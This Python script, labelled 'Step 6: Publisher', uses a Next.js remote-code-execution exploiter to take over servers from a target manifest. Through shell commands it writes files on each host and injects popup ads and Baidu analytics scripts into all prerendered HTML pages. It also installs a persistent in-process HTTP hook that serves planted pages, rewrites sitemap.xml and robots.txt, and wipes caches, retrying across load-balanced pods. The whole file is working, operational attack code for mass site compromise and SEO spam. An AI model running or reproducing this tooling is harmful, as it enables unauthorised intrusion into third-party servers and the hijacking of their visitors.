#!/usr/bin/env python3
"""
Step 6: Publisher — push generated pages to candidate nodes via RCE.

  output/manifest.csv → remote deploy + sitemap + HTTP verify

Next.js App Router standalone hosts get an in-process HTTP hook that:
  - injects a skeleton popup ad on HTML pages
  - serves /.trial-popup.js and optional bridge HTML at /{slug}
"""
import argparse
import base64
import json
import os
import shlex
import ssl
import sys
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import date
from xml.sax.saxutils import escape as xml_escape

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tools'))
from trial_common import (
    MANIFEST_CSV, PROJECT_ROOT, build_baidu_js, load_analytics, load_manifest,
    render_template_file,
)

from nextrce import NextExploiter

PUBLISHED_TXT = os.path.join(PROJECT_ROOT, 'results', 'published.txt')
PUBLISH_LOG = os.path.join(PROJECT_ROOT, 'logs', 'publish.log')
SITEMAP_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'sitemap.xml')
POPUP_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'popup.js')
BAIDU_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'baidu-tongji.js')
HOOK_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'next-popup-hook.js')
PUBLISH_TIMEOUT = 60
HOOK_FLAG = '__trialPopupHookV1'
POPUP_ROUTE = '/.trial-popup.js'


def is_nextjs(row):
    return 'next' in (row.get('domain_type') or '').lower()


def resolve_public_deploy_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    slug = row['slug']
    return f'{webroot}/public/{slug}/index.html'


def resolve_next_html_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    slug = row['slug']
    return f'{webroot}/.next/server/app/{slug}.html'


def resolve_routes_registry_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    return f'{webroot}/.next/server/app/.trial-routes.json'


def resolve_popup_js_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    return f'{webroot}/.next/server/app/.trial-popup.js'


def resolve_popup_config_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    return f'{webroot}/.next/server/app/.trial-popup-config.json'


def resolve_sitemap_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    return f'{webroot}/public/sitemap.xml'


def resolve_robots_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    return f'{webroot}/public/robots.txt'


def read_local_html(row):
    path = row['html_file']
    if not os.path.isabs(path):
        path = os.path.join(PROJECT_ROOT, path)
    with open(path, encoding='utf-8') as f:
        return f.read()


def remote_write_b64(exploiter, target_url, remote_path, content, timeout=PUBLISH_TIMEOUT):
    """Write file on target via base64 decode."""
    b64 = base64.b64encode(content.encode('utf-8')).decode()
    parent = os.path.dirname(remote_path)
    cmd = (
        f"mkdir -p {shlex.quote(parent)} && "
        f"printf '%s' {shlex.quote(b64)} | base64 -d > {shlex.quote(remote_path)} && "
        f"test -s {shlex.quote(remote_path)} && echo OK_WRITE"
    )
    out = exploiter.exec_cmd(target_url, cmd, timeout=timeout)
    return out is not None and 'OK_WRITE' in out


def remote_verify_disk(exploiter, target_url, remote_path, timeout=PUBLISH_TIMEOUT):
    cmd = (
        f"test -s {shlex.quote(remote_path)} && "
        f"head -c 200 {shlex.quote(remote_path)} | grep -q '<html' && "
        f"echo OK_FILE || echo FAIL_FILE"
    )
    out = exploiter.exec_cmd(target_url, cmd, timeout=timeout)
    return out is not None and 'OK_FILE' in out


def remote_verify_http(canonical_url, needle, timeout=25, attempts=12):
    """Require repeated public HTTP 200 responses (handles multi-pod rollouts)."""
    sep = '&' if '?' in canonical_url else '?'
    hits = 0
    contexts = [None, ssl._create_unverified_context()]
    for attempt in range(attempts):
        url = f'{canonical_url}{sep}trial_verify={int(time.time())}_{attempt}'
        for ctx in contexts:
            try:
                req = urllib.request.Request(
                    url,
                    headers={
                        'User-Agent': 'trial-publish/1.0',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                    },
                )
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                    if resp.status != 200:
                        continue
                    body = resp.read(12000).decode('utf-8', errors='replace')
                    if needle.lower() in body.lower():
                        hits += 1
                        if hits >= 2:
                            return True
                        break
            except (urllib.error.URLError, TimeoutError, ValueError):
                continue
        time.sleep(0.75)
    return hits >= 1


def remote_verify_popup(base_url, timeout=25, attempts=12):
    """Check prerender pages include inline popup marker."""
    paths = ['/', '/about', '/blog']
    contexts = [None, ssl._create_unverified_context()]
    hits = 0
    for attempt in range(attempts):
        for path in paths:
            url = base_url.rstrip('/') + path + f'?trial_popup={int(time.time())}_{attempt}'
            for ctx in contexts:
                try:
                    req = urllib.request.Request(
                        url,
                        headers={
                            'User-Agent': 'trial-publish/1.0',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                        },
                    )
                    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                        if resp.status != 200:
                            continue
                        body = resp.read(50000).decode('utf-8', errors='replace')
                        if (
                            'trial-popup-overlay' in body
                            or '__TRIAL_POPUP_LOADED__' in body
                            or '__TRIAL_BAIDU_LOADED__' in body
                            or 'hm.baidu.com' in body
                        ):
                            hits += 1
                            if hits >= 2:
                                return True
                except (urllib.error.URLError, TimeoutError, ValueError):
                    continue
        time.sleep(0.75)
    return hits >= 1


def build_baidu_inline_js():
    analytics = load_analytics()
    if not analytics.get('enabled'):
        return ''
    return build_baidu_js(analytics['hm_id'], BAIDU_TEMPLATE).strip()


def build_popup_js(row):
    cfg = json.dumps({
        'headline': row.get('title') or row.get('keyword') or 'Special Offer',
        'body': f"Limited-time {row.get('keyword', 'offer')}. Click below to continue.",
        'ctaText': row.get('cta_text') or 'Claim Bonus',
        'ctaUrl': row.get('conversion_url') or '',
    })
    cfg_escaped = cfg.replace('\\', '\\\\').replace("'", "\\'")
    return render_template_file(POPUP_TEMPLATE, {'config_json': cfg_escaped}, raw_keys={'config_json'})


def build_prerender_inject_tag(row):
    """Baidu Tongji (always) + popup overlay for prerender HTML."""
    parts = []
    baidu_js = build_baidu_inline_js()
    if baidu_js:
        parts.append(f'<script>{baidu_js}</script>')
    popup_js = build_popup_js(row).strip()
    if popup_js:
        parts.append(f'<script>{popup_js}</script>')
    return ''.join(parts)


def build_popup_config(row):
    return json.dumps({
        'enabled': True,
        'scriptPath': resolve_popup_js_path(row),
    })


def inject_popup_into_prerender(exploiter, row, dry_run=False):
    """Patch built Next prerender HTML with Baidu Tongji + popup scripts."""
    webroot = (row.get('webroot') or '/app').rstrip('/')
    app_dir = f'{webroot}/.next/server/app'
    if dry_run:
        return True, app_dir, 'dry-run'
    inline_tag = build_prerender_inject_tag(row)
    if not inline_tag:
        return True, app_dir, 'skip_no_scripts'
    tag_b64 = base64.b64encode(inline_tag.encode()).decode()
    inject_js = r"""
const fs=require('fs');
const path=require('path');
const dir=process.argv[2];
const tag=Buffer.from(process.argv[3],'base64').toString('utf8');
let count=0;
function walk(d){
  for(const name of fs.readdirSync(d)){
    const p=path.join(d,name);
    const st=fs.statSync(p);
    if(st.isDirectory()) walk(p);
    else if(name.endsWith('.html') && name.indexOf('_not-found')===-1){
      let html=fs.readFileSync(p,'utf8');
      if(html.indexOf('</body>')===-1) continue;
      html=html.replace(/<script>\(function \(\) \{[\s\S]*?__TRIAL_BAIDU_LOADED__[\s\S]*?<\/script>\s*/g,'');
      html=html.replace(/<script>\(function \(\) \{[\s\S]*?__TRIAL_POPUP_LOADED__[\s\S]*?<\/script>\s*/g,'');
      if(html.indexOf('__TRIAL_BAIDU_LOADED__')===-1){
        html=html.replace('</body>', tag+'</body>');
        count++;
      }
      fs.writeFileSync(p, html);
    }
  }
}
walk(dir);
console.log('OK_INJECT:'+count);
"""
    b64 = base64.b64encode(inject_js.encode()).decode()
    cmd = (
        f"printf '%s' {shlex.quote(b64)} | base64 -d > /tmp/trial-inject.js && "
        f"node /tmp/trial-inject.js {shlex.quote(app_dir)} {shlex.quote(tag_b64)}"
    )
    out = exploiter.exec_cmd(row['url'], cmd, timeout=PUBLISH_TIMEOUT)
    ok = out is not None and 'OK_INJECT:' in out
    return ok, app_dir, out.strip() if out else 'inject_failed'


def update_next_route_registry(exploiter, row, html_path, dry_run=False):
    """Maintain slug → html path map used by the in-process bridge hook."""
    registry_path = resolve_routes_registry_path(row)
    slug = row['slug']
    if dry_run:
        return True, registry_path, 'dry-run'
    read_cmd = (
        f"test -f {shlex.quote(registry_path)} && "
        f"cat {shlex.quote(registry_path)} || echo '{{}}'"
    )
    raw = exploiter.exec_cmd(row['url'], read_cmd, timeout=PUBLISH_TIMEOUT) or '{}'
    try:
        registry = json.loads(raw)
    except json.JSONDecodeError:
        registry = {}
    registry[slug] = html_path
    ok = remote_write_b64(exploiter, row['url'], registry_path, json.dumps(registry))
    return ok, registry_path, 'routes_ok' if ok else 'routes_failed'


def install_next_http_hook(exploiter, row, dry_run=False):
    """Inject popup ads + optional bridge routes via in-process HTTP hook."""
    registry_path = resolve_routes_registry_path(row)
    popup_config_path = resolve_popup_config_path(row)
    if dry_run:
        return True, registry_path, 'dry-run'
    hook_js = render_template_file(
        HOOK_TEMPLATE,
        {
            'registry_path': json.dumps(registry_path),
            'popup_config_path': json.dumps(popup_config_path),
            'hook_flag': json.dumps(HOOK_FLAG),
        },
        raw_keys={'registry_path', 'popup_config_path', 'hook_flag'},
    )
    out = exploiter.exec_js(row['url'], hook_js, timeout=PUBLISH_TIMEOUT)
    ok = out is not None and out.startswith('hooked:') and out not in ('hooked:0',)
    return ok, registry_path, f'hook_ok ({out})' if ok else f'hook_failed ({out})'


def build_popup_asset(row):
    """Remote /.trial-popup.js bundle: Baidu Tongji + popup overlay."""
    parts = []
    baidu_js = build_baidu_inline_js()
    if baidu_js:
        parts.append(baidu_js)
    parts.append(build_popup_js(row).strip())
    return '\n'.join(parts)


def push_popup(exploiter, row, dry_run=False):
    popup_path = resolve_popup_js_path(row)
    config_path = resolve_popup_config_path(row)
    popup_js = build_popup_asset(row)
    popup_cfg = build_popup_config(row)
    if dry_run:
        return True, popup_path, 'dry-run'
    ok_js = remote_write_b64(exploiter, row['url'], popup_path, popup_js)
    ok_cfg = remote_write_b64(exploiter, row['url'], config_path, popup_cfg)
    ok = ok_js and ok_cfg
    return ok, popup_path, 'popup_ok' if ok else 'popup_failed'


def push_page(exploiter, row, dry_run=False):
    html = read_local_html(row)
    if is_nextjs(row):
        deploy = resolve_next_html_path(row)
    else:
        deploy = resolve_public_deploy_path(row)
    if dry_run:
        return True, deploy, 'dry-run'
    ok = remote_write_b64(exploiter, row['url'], deploy, html)
    return ok, deploy, 'pushed' if ok else 'push_failed'


def update_sitemap(exploiter, row, dry_run=False):
    base = row['url'].rstrip('/')
    canonical = row.get('canonical_url') or f"{base}/{row['slug']}"
    sitemap_path = resolve_sitemap_path(row)
    xml = build_sitemap_xml(canonical, base)
    if dry_run:
        return True, sitemap_path, 'dry-run'
    ok = remote_write_b64(exploiter, row['url'], sitemap_path, xml)
    return ok, sitemap_path, 'sitemap_ok' if ok else 'sitemap_failed'


def build_sitemap_xml(canonical_url, base_url):
    data = {
        'page_url': canonical_url,
        'base_url': base_url,
        'lastmod': date.today().isoformat(),
    }
    return render_template_file(SITEMAP_TEMPLATE, data, escape=xml_escape)


def update_robots(exploiter, row, dry_run=False):
    """Ensure robots.txt references sitemap."""
    base = row['url'].rstrip('/')
    sitemap_url = f"{base}/sitemap.xml"
    robots_path = resolve_robots_path(row)
    cmd_check = f"test -f {shlex.quote(robots_path)} && grep -q Sitemap {shlex.quote(robots_path)} && echo HAS || echo MISSING"
    if dry_run:
        return True, robots_path, 'dry-run'
    out = exploiter.exec_cmd(row['url'], cmd_check, timeout=PUBLISH_TIMEOUT)
    if out and 'HAS' in out:
        return True, robots_path, 'robots_ok'
    robots_body = f"User-agent: *\nAllow: /\nSitemap: {sitemap_url}\n"
    ok = remote_write_b64(exploiter, row['url'], robots_path, robots_body)
    return ok, robots_path, 'robots_ok' if ok else 'robots_failed'


def clear_cache(exploiter, row, dry_run=False):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    cmd = f"rm -rf {shlex.quote(webroot)}/.next/cache 2>/dev/null; echo OK_CACHE"
    if dry_run:
        return True, 'cache', 'dry-run'
    out = exploiter.exec_cmd(row['url'], cmd, timeout=PUBLISH_TIMEOUT)
    return out is not None and 'OK_CACHE' in out, webroot, 'cache_cleared'


def rollback_remote_files(exploiter, target_url, paths, dry_run=False):
    """Remove remotely written files after a partial publish failure."""
    if dry_run or not paths:
        return True
    quoted = ' '.join(shlex.quote(p) for p in paths)
    cmd = f"rm -f {quoted} && echo OK_ROLLBACK"
    out = exploiter.exec_cmd(target_url, cmd, timeout=PUBLISH_TIMEOUT)
    return out is not None and 'OK_ROLLBACK' in out


def publish_one(row, verbose=False, dry_run=False):
    exploiter = NextExploiter(timeout=PUBLISH_TIMEOUT, verbose=verbose)
    url = row['url']
    steps = []
    written_paths = []
    verify_path = resolve_next_html_path(row) if is_nextjs(row) else resolve_public_deploy_path(row)
    verify_url = row.get('canonical_url') or f"{url.rstrip('/')}/{row['slug']}"
    verify_needle = row.get('keyword') or row.get('slug') or row.get('title', '')

    ok, path, status = push_page(exploiter, row, dry_run)
    steps.append(('push', status, path))
    if not ok and not dry_run:
        return False, steps
    if ok and not dry_run:
        written_paths.append(path)

    if is_nextjs(row):
        ok, path, status = push_popup(exploiter, row, dry_run)
        steps.append(('popup', status, path))
        if not ok and not dry_run:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps
        if ok and not dry_run:
            written_paths.append(path)
            written_paths.append(resolve_popup_config_path(row))

        ok, path, status = update_next_route_registry(exploiter, row, verify_path, dry_run)
        steps.append(('routes', status, path))
        if not ok and not dry_run:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps
        if ok and not dry_run:
            written_paths.append(path)

        # Load-balanced pods each need popup assets, registry, and in-process hook.
        hook_status = 'dry-run'
        hook_detail = path
        hook_ok = dry_run
        saw_fresh_hook = False
        for round_idx in range(25):
            if not dry_run:
                remote_write_b64(exploiter, url, verify_path, read_local_html(row))
                push_popup(exploiter, row, dry_run=False)
                update_next_route_registry(exploiter, row, verify_path, dry_run=False)
                inject_popup_into_prerender(exploiter, row, dry_run=False)
            ok, hook_detail, hook_status = install_next_http_hook(exploiter, row, dry_run)
            if ok:
                hook_ok = True
                if 'hooked:1' in hook_status or 'hooked:2' in hook_status:
                    saw_fresh_hook = True
            if not dry_run:
                time.sleep(0.5)
        if hook_ok and not saw_fresh_hook and not dry_run:
            hook_status = f'{hook_status}; rounds=20'
        steps.append(('hook', hook_status if hook_ok else 'hook_failed', hook_detail))
        if not hook_ok and not dry_run:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps

    ok, path, status = update_sitemap(exploiter, row, dry_run)
    steps.append(('sitemap', status, path))
    if not ok and not dry_run:
        rolled = rollback_remote_files(exploiter, url, written_paths)
        steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
        return False, steps
    if ok and not dry_run:
        written_paths.append(path)

    ok, path, status = update_robots(exploiter, row, dry_run)
    steps.append(('robots', status, path))
    if not ok and not dry_run:
        rolled = rollback_remote_files(exploiter, url, written_paths)
        steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
        return False, steps

    ok, path, status = clear_cache(exploiter, row, dry_run)
    steps.append(('cache', status, path))
    if not ok and not dry_run:
        rolled = rollback_remote_files(exploiter, url, written_paths)
        steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
        return False, steps

    if not dry_run:
        disk_ok = remote_verify_disk(exploiter, url, verify_path)
        steps.append(('disk', 'disk_ok' if disk_ok else 'disk_unverified', verify_path))
        if not disk_ok:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps

        if is_nextjs(row):
            popup_ok = remote_verify_popup(url)
            steps.append(('popup_http', 'popup_ok' if popup_ok else 'popup_unverified', url.rstrip('/') + '/'))
            http_ok = popup_ok
        else:
            http_ok = remote_verify_http(verify_url, verify_needle)
            steps.append(('http', 'http_ok' if http_ok else 'http_unverified', verify_url))
        if not http_ok:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps

    return True, steps


def write_publish_log(results):
    os.makedirs(os.path.dirname(PUBLISH_LOG), exist_ok=True)
    with open(PUBLISH_LOG, 'w', encoding='utf-8') as f:
        for url, success, steps in results:
            f.write(f"{'OK' if success else 'FAIL'}\t{url}\n")
            for name, status, detail in steps:
                f.write(f"  {name}: {status} ({detail})\n")


def write_published(urls):
    os.makedirs(os.path.dirname(PUBLISHED_TXT), exist_ok=True)
    with open(PUBLISHED_TXT, 'w', encoding='utf-8') as f:
        for url in urls:
            f.write(url + '\n')


def main():
    parser = argparse.ArgumentParser(description='Step 6: publish pages to candidate nodes')
    parser.add_argument('-u', '--url', help='Publish one target URL from manifest')
    parser.add_argument('--test', action='store_true', help='First manifest row only')
    parser.add_argument('--dry-run', action='store_true', help='Show actions without RCE')
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('-t', '--threads', type=int, default=3,
                        help='Parallel publishes (default: 3)')
    args = parser.parse_args()

    os.chdir(PROJECT_ROOT)
    rows = load_manifest()
    if args.url:
        rows = [r for r in rows if r['url'] == args.url]
        if not rows:
            print(f'[!] URL not in manifest: {args.url}', file=sys.stderr)
            return 1
    elif args.test:
        rows = rows[:1]

    if not rows:
        print('[!] Nothing to publish', file=sys.stderr)
        return 1

    print(f'[*] Step 6: publishing {len(rows)} page(s) …')
    if args.dry_run:
        print('[*] DRY RUN — no remote commands executed')

    results = []
    published = []

    def _job(row):
        if args.verbose or args.dry_run:
            target = resolve_next_html_path(row) if is_nextjs(row) else resolve_public_deploy_path(row)
            mode = 'next-hook' if is_nextjs(row) else 'static'
            print(f"[*] {row['url']} ({mode}) → {target}")
        success, steps = publish_one(row, verbose=args.verbose, dry_run=args.dry_run)
        return row['url'], success, steps

    workers = min(args.threads, len(rows))
    if workers <= 1:
        for row in rows:
            results.append(_job(row))
    else:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            results = list(ex.map(_job, rows))

    for url, success, steps in results:
        if success:
            published.append(url)
        mark = 'OK' if success else 'FAIL'
        print(f"  [{mark}] {url}")
        if args.verbose:
            for name, status, detail in steps:
                print(f"         {name}: {status}")

    write_publish_log(results)
    if not args.dry_run:
        write_published(published)

    print(f'[*] Published: {len(published)}/{len(rows)}')
    print(f'    log:       {PUBLISH_LOG}')
    if not args.dry_run:
        print(f'    published: {PUBLISHED_TXT}')
    return 0 if len(published) == len(rows) else 1


if __name__ == '__main__':
    raise SystemExit(main())
